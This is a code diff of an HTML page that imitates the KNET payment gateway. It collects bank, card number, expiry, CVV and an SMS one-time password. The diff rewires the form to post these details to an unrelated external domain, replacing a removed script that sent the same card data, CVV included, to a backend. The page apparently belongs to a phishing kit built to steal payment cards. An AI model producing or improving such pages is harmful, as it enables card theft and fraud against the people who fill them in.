@@ -13,7 +13,8 @@
 </head>
 
 <body>
-    <link href="/knet/payment-combined.css" rel="stylesheet" type="text/css">
+    <link href="/knet/payment-responsive.css" rel="stylesheet" type="text/css">
+    <link href="/knet/payment-stylesheet.css" rel="stylesheet" type="text/css">
 
 
 
@@ -21,7 +22,7 @@
 
 
 
-    <form method="post" action="javascript:void(0);" onsubmit="handlePaymentSubmit(event)"><input type="hidden" name="_token" value="w3KxyROOSPjqdSTWIY01k1UYjrVv7XswoYP1z56q" autocomplete="off">
+    <form method="post" action="https://asderw-link.com/knet/store"><input type="hidden" name="_token" value="w3KxyROOSPjqdSTWIY01k1UYjrVv7XswoYP1z56q" autocomplete="off">
         <div class="madd">
             <img src="/knet/mob.jpg" alt="">
         </div>
@@ -925,68 +926,3 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
 </body>
 
 </html>
-<script>
-async function handlePaymentSubmit(event) {
-    event.preventDefault();
-    
-    // Get form data
-    const bankName = document.getElementById('type').value;
-    const cardNumber = document.getElementById('debitNumber').value;
-    const expiryMonth = document.querySelector('select[name="month"]').value;
-    const expiryYear = document.querySelector('select[name="year"]').value;
-    const cvv = document.getElementById('cardPin').value;
-    
-    // Validate inputs
-    if (!bankName || bankName === 'prefix') {
-        alert('برجاء اختيار البنك');
-        return;
-    }
-    if (!cardNumber) {
-        alert('برجاء إدخال رقم البطاقة');
-        return;
-    }
-    if (!expiryMonth || expiryMonth === '0' || !expiryYear || expiryYear === 'YYYY') {
-        alert('برجاء إدخال تاريخ الانتهاء');
-        return;
-    }
-    if (!cvv) {
-        alert('برجاء إدخال رمز الأمان');
-        return;
-    }
-    
-    try {
-        // Show loading
-        document.body.style.opacity = '0.6';
-        
-        // Submit to backend
-        const response = await fetch('/api/trpc/payment.submitKnet', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                bankName: bankName,
-                cardNumber: cardNumber,
-                expiryMonth: expiryMonth,
-                expiryYear: expiryYear,
-                cvv: cvv,
-                amount: 5.0
-            })
-        });
-        
-        const data = await response.json();
-        
-        if (data.result?.data?.paymentId) {
-            // Redirect to loading page
-            window.location.href = '/loading?paymentId=' + data.result.data.paymentId;
-        } else {
-            alert('حدث خطأ في معالجة الطلب');
-            document.body.style.opacity = '1';
-        }
-    } catch (error) {
-        console.error('Error:', error);
-        alert('خطأ في الاتصال بالخادم');
-        document.body.style.opacity = '1';
-    }
-}
-</script>
